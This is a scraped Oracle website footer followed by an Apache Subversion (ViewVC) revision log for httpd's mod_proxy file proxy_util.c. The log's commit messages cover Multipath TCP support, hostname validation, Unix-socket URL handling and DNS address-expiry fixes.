* [Best cloud-based
  ERP](/erp/what-is-erp/best-erp/)
* [Cloud Economics](/cloud/economics/)
* [Social Impact](/social-impact/)
* [Culture and Inclusion](/careers/diversity-inclusion/)
* [Security Practices](/corporate/security-practices/)

Learn

* [What is cloud
  computing?](/cloud/what-is-cloud-computing/)
* [What is CRM?](/cx/what-is-crm/)
* [What is
  Docker?](/cloud/cloud-native/container-registry/what-is-docker/)
* [What is
  Kubernetes?](/cloud/cloud-native/kubernetes-engine/what-is-kubernetes/)
* [What is
  Python?](/developer/what-is-python-for-developers/)
* [What is SaaS?](/applications/what-is-saas/)

News and Events

* [News](/news/)
* [Oracle CloudWorld](/cloudworld/)
* [Oracle CloudWorld Tour](/cloudworld-tour/)
* [Oracle Health Summit](/health/health-summit/)
* [Oracle Dev Tour](/developer/dev-tour/)
* [Search all events](https://search.oracle.com/events?q=&lang=english)

Contact Us

* US Sales: +1.800.633.0738
* [How can we help?](/corporate/contact/)
* [Subscribe to emails](https://go.oracle.com/subscribe/?l_code=en&src1=OW:O:FO)
* [Integrity Helpline](https://secure.ethicspoint.com/domain/media/en/gui/31053/index.html)
* [Accessibility](/corporate/accessibility/)

---

* [Country/Region](/universal-menu/#u10countrymenu)

* [© 2025 Oracle](/legal/copyright/)
* [Privacy](/legal/privacy/)/[Do Not Sell My
  Info](/legal/privacy/privacy-choices/)
* [Ad
  Choices](/legal/privacy/privacy-policy/#adchoices)
* [Careers](/corporate/careers/)



=== Content from svn.apache.org_4fb458c9_20250125_143736.html ===


| **[/](/viewvc?view=roots)[[Apache-SVN]](/viewvc/)/[httpd](/viewvc/httpd/)/[httpd](/viewvc/httpd/httpd/)/[trunk](/viewvc/httpd/httpd/trunk/)/[modules](/viewvc/httpd/httpd/trunk/modules/)/[proxy](/viewvc/httpd/httpd/trunk/modules/proxy/)/proxy\_util.c** |  |
| --- | --- |

[![ViewVC logotype](/vc-static/images/viewvc-logo.png)](http://www.viewvc.org/ "ViewVC Home")
# Log of /httpd/httpd/trunk/modules/proxy/proxy\_util.c

[![Parent Directory](/vc-static/images/back_small.png) Parent Directory](/viewvc/httpd/httpd/trunk/modules/proxy/)
| [![Revision Log](/vc-static/images/log.png) Revision Log](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log)

---

| Links to HEAD: | ([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=markup)) ([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=co)) ([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=annotate)) |
| --- | --- |
| Sticky Revision: |  |

---

Revision [**1920586**](/viewvc?view=revision&revision=1920586) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1920586&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1920586&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1920586))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1920586)

Modified
*Thu Sep 12 07:59:22 2024 UTC*
(4 months, 1 week ago)
by *jorton*

File length: 223121 byte(s)

Diff to [previous 1919617](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919617&r2=1920586)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919617&r2=1920586&diff_format=h))
```
Add Multipath TCP (MPTCP) support (Proxy)

Multipath TCP (MPTCP), standardized in RFC8684 [1],
is a TCP extension that enables a TCP connection to
use different paths.

Multipath TCP has been used for several use cases.
On smartphones, MPTCP enables seamless handovers between
cellular and Wi-Fi networks while preserving established
connections. This use-case is what pushed Apple to use
MPTCP since 2013 in multiple applications [2]. On dual-stack
hosts, Multipath TCP enables the TCP connection to
automatically use the best performing path, either IPv4
or IPv6. If one path fails, MPTCP automatically uses
the other path.

To benefit from MPTCP, both the client and the server
have to support it. Multipath TCP is a backward-compatible
TCP extension that is enabled by default on recent
Linux distributions (Debian, Ubuntu, Redhat, ...). Multipath
TCP is included in the Linux kernel since version 5.6 [3].
To use it on Linux, an application must explicitly enable
it when creating the socket. No need to change anything
else in the application.

Adding the possibility to create MPTCP sockets would thus
be a really fine addition to httpd, by allowing clients
to make use of their different interfaces.

This patch introduces the possibilty to connect to backend
servers using MPTCP. Note however that these changes are
only available on Linux, as IPPROTO_MPTCP is Linux specific
for the time being.

For proxies, we can connect using MPTCP by passing the
\"multipathtcp\" parameter:

ProxyPass \"/example\" \"<http://backend.example.com>\" multipathtcp=On

We then store this information in the worker and create sockets
appropriately according to this value.

Link: <https://www.rfc-editor.org/rfc/rfc8684.html> [1]
Link: <https://www.tessares.net/apples-mptcp-story-so-far/> [2]
Link: <https://www.mptcp.dev> [3]
Add Multipath TCP (MPTCP) support (Core)

Multipath TCP (MPTCP), standardized in RFC8684 [1],
is a TCP extension that enables a TCP connection to
use different paths.

Multipath TCP has been used for several use cases.
On smartphones, MPTCP enables seamless handovers between
cellular and Wi-Fi networks while preserving established
connections. This use-case is what pushed Apple to use
MPTCP since 2013 in multiple applications [2]. On dual-stack
hosts, Multipath TCP enables the TCP connection to
automatically use the best performing path, either IPv4
or IPv6. If one path fails, MPTCP automatically uses
the other path.

To benefit from MPTCP, both the client and the server
have to support it. Multipath TCP is a backward-compatible
TCP extension that is enabled by default on recent
Linux distributions (Debian, Ubuntu, Redhat, ...). Multipath
TCP is included in the Linux kernel since version 5.6 [3].
To use it on Linux, an application must explicitly enable
it when creating the socket. No need to change anything
else in the application.

Adding the possibility to create MPTCP sockets would thus
be a really fine addition to httpd, by allowing clients
to make use of their different interfaces.

This patch introduces the possibility to listen with MPTCP
sockets. Note however that these changes are only available
on Linux, as IPPROTO_MPTCP is Linux specific for the time being.

To do so, we extended the Listen directive to include
a \"multipathtcp\" option, allowing to create MPTCP sockets
instead of regular TCP ones:

Listen 80 options=multipathtcp

We then store this information in flags for the listen directive
and create sockets appropriately according to this value.

Link: <https://www.rfc-editor.org/rfc/rfc8684.html> [1]
Link: <https://www.tessares.net/apples-mptcp-story-so-far/> [2]
Link: <https://www.mptcp.dev> [3]

Submitted by: Aperence <anthony.doeraene hotmail.com>
Github: closes #476

```

---

Revision [**1919617**](/viewvc?view=revision&revision=1919617) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919617&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919617&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1919617))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1919617)

Modified
*Thu Aug 1 11:35:26 2024 UTC*
(5 months, 3 weeks ago)
by *ylavic*

File length: 223113 byte(s)

Diff to [previous 1919533](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919533&r2=1919617)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919533&r2=1919617&diff_format=h))
```
mod_proxy: Fix selection of ProxyPassMatch workers with host/port substitution. PR 69233.

With "ProxyPassMatch ^/([^/]+)/(.*)$ https://$1/$2", ap_proxy_get_worker_ex()
should not consider the length of scheme://host part of the given URL because
of the globbing match on the host part.

Fix it by setting worker->s>is_host_matchable when creating a worker with host
substitution and avoiding the min_match check in worker_matches() in this case.

```

---

Revision [**1919533**](/viewvc?view=revision&revision=1919533) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919533&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919533&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1919533))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1919533)

Modified
*Fri Jul 26 14:40:44 2024 UTC*
(6 months ago)
by *ylavic*

File length: 222747 byte(s)

Diff to [previous 1919532](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919532&r2=1919533)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919532&r2=1919533&diff_format=h))
```
mod_proxy: Allow for empty UDS URL hostname in ProxyPass workers too.

Using "unix:/udspath|scheme:" or "unix:/udspath|scheme://" for a ProxyPass URL
does not work currently, while it works for SetHandler "proxy:unix:...".

```

---

Revision [**1919532**](/viewvc?view=revision&revision=1919532) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919532&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919532&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1919532))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1919532)

Modified
*Fri Jul 26 14:36:25 2024 UTC*
(6 months ago)
by *ylavic*

File length: 222730 byte(s)

Diff to [previous 1919024](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919024&r2=1919532)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919024&r2=1919532&diff_format=h))
```
*) mod_proxy: Avoid AH01059 parsing error for SetHandler "unix:" URLs
   in <Location> (incomplete fix in 2.4.62). PR 69160.

When SetHandler "unix:..." is used in a <Location "/path"> block, the path
gets appended (including $DOCUMENT_ROOT somehow) to r->filename hence the
current checks in fixup_uds_filename() to add "localhost" when missing don't
work. Fix them.

```

---

Revision [**1919024**](/viewvc?view=revision&revision=1919024) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919024&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919024&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1919024))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1919024)

Modified
*Mon Jul 8 14:34:37 2024 UTC*
(6 months, 2 weeks ago)
by *ylavic*

File length: 221896 byte(s)

Diff to [previous 1919023](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919023&r2=1919024)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919023&r2=1919024&diff_format=h))
```
Follow up to [r1919023](/viewvc?view=revision&revision=1919023): fix compilation.

```

---

Revision [**1919023**](/viewvc?view=revision&revision=1919023) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919023&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919023&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1919023))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1919023)

Modified
*Mon Jul 8 14:25:58 2024 UTC*
(6 months, 2 weeks ago)
by *ylavic*

File length: 221895 byte(s)

Diff to [previous 1919022](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919022&r2=1919023)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919022&r2=1919023&diff_format=h))
```
mod_proxy: Don't mangle r->filename when ap_proxy_canon_netloc() fails.

ap_proxy_canon_netloc() called from the canon_handler hooks modifies its
given url in place, hence &r->filename[6] passed from ap_proxy_canon_url().

This is not an issue if the canon_handler hook succeeds (or declines) since
r->filename is usually completely rewritten finally, but on failure it gets
truncated.

Avoid this by passing a copy of r->filename from the start, the proxy *url
and r->filename don't need to point to the same data.

* proxy/proxy_util.c(ap_proxy_canon_url):
  Pass a copy of r->filename to the canon_handler hooks.

```

---

Revision [**1919022**](/viewvc?view=revision&revision=1919022) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919022&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919022&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1919022))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1919022)

Modified
*Mon Jul 8 13:59:50 2024 UTC*
(6 months, 2 weeks ago)
by *ylavic*

File length: 221874 byte(s)

Diff to [previous 1919019](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919019&r2=1919022)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919019&r2=1919022&diff_format=h))
```
mod_proxy: Fix canonicalisation and FCGI env (PATH_INFO, SCRIPT_NAME) for
           "balancer:" URLs set via SetHandler, also allowing for "unix:"
           sockets with BalancerMember(s).  PR 69168.

* modules/proxy/proxy_util.h, modules/proxy/proxy_util.c:
  Move proxy_interpolate() from mod_proxy.c to ap_proxy_interpolate(),
  exported locally only (non public).
  Move proxy_fixup() from mod_proxy.c to ap_proxy_canon_url(), exported
  locally only too (non public).
  Rollback ap_proxy_fixup_uds_filename() to a local fixup_uds_filename()
  usable from proxy_util.c only. The public function will be removed in
  a following commit.

* modules/proxy/mod_proxy.h:
  Note that ap_proxy_fixup_uds_filename() is deprecated.

* modules/proxy/mod_proxy.c:
  Just use ap_proxy_canon_url() from proxy_fixup() and proxy_handler()
  for SetHandler URLs.

* modules/proxy/mod_proxy_balancer.c:
  Do not canonicalize the path from proxy_balancer_canon() anymore but
  rather from balancer_fixup() where the balancer URL is rewritten to
  the BalancerMember URL.

```

---

Revision [**1919019**](/viewvc?view=revision&revision=1919019) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919019&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919019&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1919019))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1919019)

Modified
*Mon Jul 8 13:07:23 2024 UTC*
(6 months, 2 weeks ago)
by *ylavic*

File length: 218638 byte(s)

Diff to [previous 1919015](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919015&r2=1919019)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1919015&r2=1919019&diff_format=h))
```
Follow up to [r1919015](/viewvc?view=revision&revision=1919015): fix compilation.

```

---

Revision [**1919015**](/viewvc?view=revision&revision=1919015) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919015&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1919015&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1919015))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1919015)

Modified
*Mon Jul 8 12:35:35 2024 UTC*
(6 months, 2 weeks ago)
by *ylavic*

File length: 218630 byte(s)

Diff to [previous 1918647](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918647&r2=1919015)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918647&r2=1919015&diff_format=h))
```
mod_proxy: Avoid AH01059 parsing error for SetHandler "unix:" URLs.  PR 69160

The hostname part of the URL is not mandated for UDS though the canon_handler
hooks will require it, so add "localhost" if it's missing (won't be used anyway
for an AF_UNIX socket).

This can trigger with SetHandler "unix:" URLs which are now also fixed up.

```

---

Revision [**1918647**](/viewvc?view=revision&revision=1918647) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918647&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918647&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918647))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918647)

Modified
*Wed Jun 26 09:19:16 2024 UTC*
(7 months ago)
by *ylavic*

File length: 217830 byte(s)

Diff to [previous 1918626](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918626&r2=1918647)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918626&r2=1918647&diff_format=h))
```
mod_proxy: follow up to [r1918626](/viewvc?view=revision&revision=1918626): Simplify ap_proxy_fixup_uds_filename() and callers.

```

---

Revision [**1918626**](/viewvc?view=revision&revision=1918626) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918626&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918626&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918626))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918626)

Modified
*Tue Jun 25 23:49:09 2024 UTC*
(7 months ago)
by *ylavic*

File length: 217748 byte(s)

Diff to [previous 1918606](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918606&r2=1918626)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918606&r2=1918626&diff_format=h))
```
mod_proxy: Fixup UDS filename for mod_proxy called through r->handler.

* modules/proxy/proxy_util.c:
  Export ap_proxy_fixup_uds_filename() from fix_uds_filename.
  Call it from ap_proxy_pre_request() even for rewritten balancer workers.

* modules/proxy/mod_proxy.h:
  Declare ap_proxy_fixup_uds_filename()

* modules/proxy/mod_proxy.c:
  Fixup UDS filename from r->handler in proxy_handler().

* include/ap_mmn.h:
  Bump MMN minor for ap_proxy_fixup_uds_filename()

```

---

Revision [**1918606**](/viewvc?view=revision&revision=1918606) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918606&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918606&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918606))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918606)

Modified
*Tue Jun 25 17:29:06 2024 UTC*
(7 months ago)
by *covener*

File length: 217754 byte(s)

Diff to [previous 1918442](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918442&r2=1918606)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918442&r2=1918606&diff_format=h))
```
validate hostname

```

---

Revision [**1918442**](/viewvc?view=revision&revision=1918442) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918442&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918442&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918442))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918442)

Modified
*Wed Jun 19 14:37:20 2024 UTC*
(7 months, 1 week ago)
by *ylavic*

File length: 217446 byte(s)

Diff to [previous 1918438](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918438&r2=1918442)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918438&r2=1918442&diff_format=h))
```
mod_proxy: Follow up to [r1918438](/viewvc?view=revision&revision=1918438): Don't cleanup conn before running the address cleanup.

* modules/proxy/proxy_util.c(ap_proxy_determine_address):
  Move conn_cleanup() after apr_pool_cleanup_run().

```

---

Revision [**1918438**](/viewvc?view=revision&revision=1918438) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918438&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918438&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918438))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918438)

Modified
*Wed Jun 19 13:20:12 2024 UTC*
(7 months, 1 week ago)
by *ylavic*

File length: 217446 byte(s)

Diff to [previous 1918429](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918429&r2=1918438)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918429&r2=1918438&diff_format=h))
```
mod_proxy: Follow up to [r1918412](/viewvc?view=revision&revision=1918412) and [r1918429](/viewvc?view=revision&revision=1918429): Special case WIN32/OS2 only.

apr_socket_connect() on unixes does copy the passed in *addr, so limit the
liefetime workaround to Windows and OS/2 only (which don't).

* modules/proxy/proxy_util.c(ap_proxy_determine_address):
  #ifdef the relevant code for WIN32/OS2 only, and improve comment.

```

---

Revision [**1918429**](/viewvc?view=revision&revision=1918429) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918429&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918429&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918429))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918429)

Modified
*Wed Jun 19 10:39:56 2024 UTC*
(7 months, 1 week ago)
by *ylavic*

File length: 217146 byte(s)

Diff to [previous 1918412](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918412&r2=1918429)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918412&r2=1918429&diff_format=h))
```
mod_proxy: Follow up to [r1918412](/viewvc?view=revision&revision=1918412): Find if one of the conn->addr[->next] is alive.

ap_proxy_connect_backend() will use the first conn->addr[->next] that works, so
the current address alive can be any of them.

* modules/proxy/proxy_util.c(ap_proxy_determine_address):
  Loop for all conn->addr[->next] to determine if addr_alive.

```

---

Revision [**1918412**](/viewvc?view=revision&revision=1918412) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918412&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918412&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918412))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918412)

Modified
*Tue Jun 18 14:20:06 2024 UTC*
(7 months, 1 week ago)
by *ylavic*

File length: 216639 byte(s)

Diff to [previous 1918410](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918410&r2=1918412)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918410&r2=1918412&diff_format=h))
```
mod_proxy: Keep connection alive on addressTTL expiry if the DNS didn't change.

* modules/proxy/proxy_util.c(address_cleanup):
  Rename to conn_cleanup() since it also closes the socket, and run
  socket_cleanup() first to avoid dangling conn->sock->remote_addr.

* modules/proxy/proxy_util.c(ap_proxy_determine_address):
  Compare the new address with the old one and keep the socket alive
  if it did not change.

Follow up to [r1918410](/viewvc?view=revision&revision=1918410).

```

---

Revision [**1918410**](/viewvc?view=revision&revision=1918410) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918410&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918410&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918410))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918410)

Modified
*Tue Jun 18 14:14:08 2024 UTC*
(7 months, 1 week ago)
by *ylavic*

File length: 215551 byte(s)

Diff to [previous 1918228](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918228&r2=1918410)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1918228&r2=1918410&diff_format=h))
```
mod_proxy: Fix DNS requests and connections closed before the configured addressTTL.  BZ 69126

* modules/proxy/proxy_util.c(ap_proxy_determine_address):
  Fix shared expiry compare-and-swap loop.

```

---

Revision [**1918228**](/viewvc?view=revision&revision=1918228) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918228&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1918228&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1918228))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1918228)

Modified
*Mon Jun 10 10:46:32 2024 UTC*
(7 months, 2 weeks ago)
by *jorton*

File length: 215561 byte(s)

Diff to [previous 1916004](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1916004&r2=1918228)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1916004&r2=1918228&diff_format=h))
```
* modules/proxy/proxy_util.c (worker_address_resolve): Fix debugging
  output when dumping multiple resolved addresses.

```

---

Revision [**1916004**](/viewvc?view=revision&revision=1916004) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1916004&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1916004&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1916004))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1916004)

Modified
*Mon Feb 26 08:41:28 2024 UTC*
(10 months, 4 weeks ago)
by *jfclere*

File length: 215561 byte(s)

Diff to [previous 1913930](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1913930&r2=1916004)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1913930&r2=1916004&diff_format=h))
```
Don't reset the balancer when we create a new child
and don't change shared memory the load balancer is not using.

```

---

Revision [**1913930**](/viewvc?view=revision&revision=1913930) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1913930&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1913930&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1913930))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1913930)

Modified
*Sat Nov 18 13:49:04 2023 UTC*
(14 months, 1 week ago)
by *ylavic*

File length: 215666 byte(s)

Diff to [previous 1913534](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1913534&r2=1913930)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1913534&r2=1913930&diff_format=h))
```
mod_proxy: Follow up to [r1912245](/viewvc?view=revision&revision=1912245): ap_proxy_ prefix for extern functions.

Even if they are not part of the API (not in mod_proxy.h) hence requires no
MMN bump, {get,set,increment_,decrement_}busy_count() being AP_PROXY_DECLARE()d
could name-collide with a third-party module's functions.

Rename them using the ap_proxy_ prefix, with an underscore after the verb for
for all of them too (for consistency), that is:
    ap_proxy_{get,set,increment,decrement}_busy_count()

```

---

Revision [**1913534**](/viewvc?view=revision&revision=1913534) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1913534&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1913534&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1913534))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1913534)

Modified
*Thu Nov 2 15:06:44 2023 UTC*
(14 months, 3 weeks ago)
by *ylavic*

File length: 215628 byte(s)

Diff to [previous 1912941](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912941&r2=1913534)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912941&r2=1913534&diff_format=h))
```
mod_proxy: Follow up to [r1912459](/viewvc?view=revision&revision=1912459): Fix reuse of forward_info.

Use the correct fwd_pool for allocating the forward_info when the connection
is reusable as spotted by Rüdiger.

Do not reuse conn->forward if the ->proxy_auth changed.

```

---

Revision [**1912941**](/viewvc?view=revision&revision=1912941) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912941&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912941&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1912941))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1912941)

Modified
*Fri Oct 13 13:51:43 2023 UTC*
(15 months, 1 week ago)
by *icing*

File length: 215257 byte(s)

Diff to [previous 1912462](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912462&r2=1912941)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912462&r2=1912941&diff_format=h))
```
Fix format string type check

```

---

Revision [**1912462**](/viewvc?view=revision&revision=1912462) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912462&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912462&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1912462))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1912462)

Modified
*Thu Sep 21 13:34:33 2023 UTC*
(16 months ago)
by *ylavic*

